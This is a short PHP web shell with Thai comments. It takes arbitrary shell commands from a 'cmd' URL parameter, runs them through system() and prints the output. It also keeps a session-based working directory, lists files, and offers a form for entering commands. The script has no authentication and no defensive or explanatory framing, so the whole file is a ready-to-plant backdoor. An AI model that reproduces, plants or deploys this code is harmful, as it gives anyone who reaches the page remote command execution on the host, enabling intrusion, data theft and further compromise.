<?php
session_start();

// กำหนด path เริ่มต้น
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd();
}

// ถ้ามีการเปลี่ยน directory
if (isset($_GET['cd'])) {
    $newDir = realpath($_SESSION['cwd'] . '/' . $_GET['cd']);
    if ($newDir && is_dir($newDir)) {
        $_SESSION['cwd'] = $newDir;
    }
}

// รันคำสั่ง
if (isset($_GET['cmd'])) {
    chdir($_SESSION['cwd']);
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}

// แสดง path ปัจจุบัน
echo "<h3>Current Path: " . $_SESSION['cwd'] . "</h3>";

// ปุ่มย้อนกลับ
echo "<a href='?cd=..'>⬅ Back</a><br><br>";

// แสดงไฟล์ใน directory
$files = scandir($_SESSION['cwd']);
foreach ($files as $file) {
    if ($file == ".") continue;

    if (is_dir($_SESSION['cwd'] . '/' . $file)) {
        echo "[DIR] <a href='?cd=$file'>$file</a><br>";
    } else {
        echo "[FILE] $file<br>";
    }
}
?>

<hr>

<form method="GET">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Run">
</form>